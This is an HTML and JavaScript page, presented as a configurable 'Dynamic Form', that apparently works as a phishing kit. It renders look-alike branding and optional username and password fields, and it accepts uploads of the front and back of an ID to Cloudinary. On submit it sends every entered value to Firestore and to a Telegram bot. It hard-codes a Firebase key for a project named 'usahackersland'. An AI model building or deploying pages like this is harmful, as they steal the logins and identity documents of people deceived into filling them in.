<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dynamic Form</title>
<style>
body{margin:0;padding:0;font-family:Arial,sans-serif;}
#formContainer{max-width:650px;margin:30px auto;padding:20px;background:#fff;border-radius:12px;box-shadow:0 0 15px rgba(0,0,0,.1);position:relative;}
img, video, iframe{max-width:100%;border-radius:8px;margin:6px 0;}
input, textarea, select{width:100%;padding:10px;margin:6px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box;}
button{cursor:pointer;color:#fff;border:none;padding:10px;border-radius:8px;}
.draggableBtn{position:absolute;cursor:move;}
</style>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>
<body>

<div id="formContainer">
  <div id="imageContainer"></div>
  <h2 id="formTitle"></h2>
  <p id="formDesc"></p>
  <div id="galleryContainer"></div>
  <div id="videoContainer"></div>
  <p id="warningMsg" style="color:#b71c1c;text-align:center;"></p>
  <form id="dynamicForm"></form>
  <footer id="formFooter" style="text-align:center;margin-top:10px;font-size:12px;"></footer>
</div>

<script>
const $ = id => document.getElementById(id);

/* ===== CONFIG ===== */
const CLOUDINARY_UPLOAD_PRESET = "form_upload_preset";
const CLOUDINARY_CLOUD_NAME = "dymwisuau";
const TELEGRAM_BOT = "YOUR_TELEGRAM_BOT_TOKEN";
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
const ALERT_EMAIL = "youremail@example.com";

/* ===== FIREBASE INIT ===== */
firebase.initializeApp({
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
});
const db = firebase.firestore();

const formId = new URLSearchParams(location.search).get("id");
if(!formId){ $("formTitle").innerText="Form ID missing"; }

let formConfig=null;
let draggingBtn=null, dx=0, dy=0;

/* ===== LOAD FORM ===== */
db.collection("forms").doc(formId).get().then(doc=>{
  if(!doc.exists){ $("formTitle").innerText="Form not found"; return; }
  formConfig=doc.data();
  renderForm();
});

/* ===== BACKGROUND ===== */
function setBackground(cfg){
  document.body.style.backgroundColor = cfg.bgColor || "#fff";

  if(cfg.bgImageURL) document.body.style.backgroundImage = `url(${cfg.bgImageURL})`;
  if(cfg.bgVideoURL){
    if(cfg.bgVideoURL.includes("youtube.com")||cfg.bgVideoURL.includes("youtu.be")){
      const id = cfg.bgVideoURL.split("v=")[1] || cfg.bgVideoURL.split("youtu.be/")[1]; 
      const iframe=document.createElement("iframe");
      iframe.src=`https://www.youtube.com/embed/${id}?autoplay=1&mute=1&loop=1&playlist=${id}&controls=0`;
      iframe.style.position="fixed"; iframe.style.top=0; iframe.style.left=0;
      iframe.style.width="100%"; iframe.style.height="100%"; iframe.style.zIndex=-1; iframe.style.pointerEvents="none";
      document.body.appendChild(iframe);
    } else {
      const video=document.createElement("video");
      video.src=cfg.bgVideoURL; video.autoplay=true; video.loop=true; video.muted=true; video.playsInline=true;
      video.style.position="fixed"; video.style.top=0; video.style.left=0; video.style.width="100%"; video.style.height="100%"; video.style.objectFit="cover"; video.style.zIndex=-1;
      document.body.appendChild(video);
    }
  }
}

/* ===== RENDER FORM ===== */
function renderForm(){
  const form = $("dynamicForm");
  const imgContainer = $("imageContainer");
  const galleryContainer = $("galleryContainer");
  const videoContainer = $("videoContainer");

  $("formTitle").innerText = formConfig.title || "";
  $("formDesc").innerText = formConfig.subtitle || "";
  setBackground(formConfig);

  // Avatar / Logo / Banner
  const addImg = (url, width, round=false) => {
    if(!url) return;
    const img = document.createElement("img"); img.src=url; img.style.width=width;
    if(round) img.style.borderRadius="50%"; imgContainer.appendChild(img);
  };
  addImg(formConfig.avatarURL,"90px",true);
  addImg(formConfig.logoURL,"140px");
  addImg(formConfig.bannerURL,"100%");

  // Gallery
  if(Array.isArray(formConfig.galleryItems)){
    galleryContainer.innerHTML="";
    const layout = formConfig.galleryItemsLayout || "list";
    const wrapper = document.createElement("div");
    if(layout==="grid") wrapper.style.display="grid"; wrapper.style.gridTemplateColumns="repeat(auto-fit,minmax(120px,1fr))"; wrapper.style.gap="10px";
    if(layout==="large-grid") wrapper.style.display="grid"; wrapper.style.gridTemplateColumns="repeat(auto-fit,minmax(200px,1fr))"; wrapper.style.gap="12px";
    if(layout==="mix") wrapper.style.display="grid"; wrapper.style.gridTemplateColumns="repeat(auto-fit,minmax(120px,1fr))"; wrapper.style.gap="12px";
    if(layout==="list") wrapper.style.display="flex"; wrapper.style.flexDirection="column"; wrapper.style.gap="12px";

    formConfig.galleryItems.forEach(item=>{
      const div=document.createElement("div"); div.style.position="relative"; div.style.marginBottom="12px";
      const img=document.createElement("img"); img.src=item.img; div.appendChild(img);
      if(item.link && item.mask){
        const a=document.createElement("a"); a.href=item.link; a.textContent=item.mask; a.target="_blank"; a.style.display="block"; a.style.color="#1976d2"; div.appendChild(a);
      }
      if(item.desc){ const p=document.createElement("p"); p.textContent=item.desc; div.appendChild(p);}
      wrapper.appendChild(div);
    });
    galleryContainer.appendChild(wrapper);
  }

  // Videos
  if(formConfig.videoLinks){
    videoContainer.innerHTML="";
    formConfig.videoLinks.forEach(link=>{
      let el;
      if(link.endsWith(".mp4")||link.endsWith(".webm")){
        el=document.createElement("video"); el.src=link; el.controls=true; el.style.width="100%"; videoContainer.appendChild(el);
      } else if(link.includes("youtube.com")||link.includes("youtu.be")){
        let id = link.includes("youtu.be")? link.split("youtu.be/")[1] : link.split("v=")[1];
        if(id.includes("&")) id=id.split("&")[0];
        el=document.createElement("iframe"); el.src=`https://www.youtube.com/embed/${id}?autoplay=0&controls=1&rel=0`; el.width="100%"; el.height="315"; el.frameBorder="0"; el.allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"; el.allowFullscreen=true;
        videoContainer.appendChild(el);
      }
    });
  }

  // Warning
  if(formConfig.enableWarning){
    $("warningMsg").innerText = formConfig.warning;
    $("warningMsg").style.textAlign = formConfig.warningPosition || "center";
  }

  // Form Fields
  if(formConfig.addAuth){
    const user=document.createElement("input"); user.placeholder=formConfig.usernamePlaceholder; form.appendChild(user);
    const pass=document.createElement("input"); pass.type="password"; pass.placeholder=formConfig.passwordPlaceholder; form.appendChild(pass);
  }
  if(Array.isArray(formConfig.extraFields)) formConfig.extraFields.forEach(f=>{const i=document.createElement("input"); i.placeholder=f; form.appendChild(i);});
  if(Array.isArray(formConfig.customFields)) formConfig.customFields.forEach(f=>{const i=document.createElement("input"); i.type=f.type; i.placeholder=f.label; form.appendChild(i);});

  // ID uploads
  if(formConfig.idFrontChk){
    const lbl=document.createElement("label"); lbl.textContent=formConfig.txtIdFront||"ID Front"; form.appendChild(lbl);
    const inp=document.createElement("input"); inp.type="file"; inp.addEventListener("change",e=>uploadFile(e,"front")); form.appendChild(inp);
  }
  if(formConfig.idBackChk){
    const lbl=document.createElement("label"); lbl.textContent=formConfig.txtIdBack||"ID Back"; form.appendChild(lbl);
    const inp=document.createElement("input"); inp.type="file"; inp.addEventListener("change",e=>uploadFile(e,"back")); form.appendChild(inp);
  }

  // Buttons
  if(formConfig.showMainBtn){
    const btn=document.createElement("button"); btn.type="button"; btn.textContent=formConfig.buttonText||"Submit"; btn.style.background=formConfig.btnColor||"#1976d2"; btn.onclick=submitForm; form.appendChild(btn);
  }

  // Extra draggable buttons
  if(formConfig.extraButtons){
    formConfig.extraButtons.forEach(b=>{
      if(!b.show) return;
      const btn=document.createElement("button"); btn.className="draggableBtn"; btn.textContent=b.text; btn.style.background=b.color; btn.style.width=b.size+"px"; btn.style.height=b.size+"px"; btn.style.left=b.x+"%"; btn.style.top=b.y+"%";
      btn.onmousedown=e=>{draggingBtn=b; dx=e.offsetX; dy=e.offsetY;};
      btn.onclick=()=>window.open(b.link,"_blank"); document.body.appendChild(btn);
    });
  }

  // Footer
  $("formFooter").innerText = formConfig.footerText||"";

  // Dragging
  document.onmousemove = e => {
    if(!draggingBtn) return;
    draggingBtn.x = ((e.clientX - dx) / window.innerWidth) * 100;
    draggingBtn.y = ((e.clientY - dy) / window.innerHeight) * 100;
    document.querySelectorAll(".draggableBtn").forEach(btn=>{
      btn.style.left = draggingBtn.x+"%"; btn.style.top = draggingBtn.y+"%";
    });
  };
  document.onmouseup = ()=>draggingBtn=null;
}

/* ===== CLOUDINARY UPLOAD ===== */
async function uploadFile(e,type){
  const file=e.target.files[0]; if(!file) return;
  const fd=new FormData(); fd.append("file",file); fd.append("upload_preset",CLOUDINARY_UPLOAD_PRESET);
  try{
    const res=await axios.post(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`,fd);
    e.target.dataset.cloudinaryUrl=res.data.secure_url;
    alert(type+" uploaded successfully!");
  }catch(err){ console.error(err); alert("Upload failed"); }
}

/* ===== SUBMIT ===== */
async function submitForm(){
  const data={};
  document.querySelectorAll("#dynamicForm input,textarea").forEach(i=>{
    if(i.type==="file") data[i.previousSibling?.textContent||i.name]=i.dataset.cloudinaryUrl||""; 
    else data[i.placeholder||i.name]=i.value;
  });
  await db.collection("submissions").add({ formId, data, createdAt:new Date() });

  // Telegram
  try{ await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{ chat_id: TELEGRAM_CHAT_ID, text:`New submission for form ${formId}: ${JSON.stringify(data)}` }); }catch(e){console.error(e);}

  // Email
  try{ await axios.post("/send-email",{ to:ALERT_EMAIL, subject:"New Form Submission", body:JSON.stringify(data) }); }catch(e){console.error(e);}

  alert("Submitted successfully!");
  $("dynamicForm").reset();
}
</script>
</body>
</html>
